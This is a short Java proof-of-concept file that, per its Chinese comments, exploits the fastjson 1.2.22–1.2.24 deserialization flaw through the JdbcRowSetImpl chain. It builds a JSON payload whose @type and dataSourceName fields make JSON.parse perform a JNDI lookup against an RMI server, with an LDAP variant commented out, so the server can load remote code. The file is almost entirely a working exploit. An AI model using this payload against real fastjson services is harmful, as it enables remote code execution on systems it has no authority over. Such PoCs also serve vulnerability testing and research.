import com.alibaba.fastjson.JSON;

/**
 * fastjson 1.2.22-1.2.24版本反序列化漏洞
 * 基于JdbcRowImpl利用链
 */
public class Poc2 {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:2099/Exploit\", \"autoCommit\":true}";
        // String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true}";

        JSON.parse(payload);
    }
}
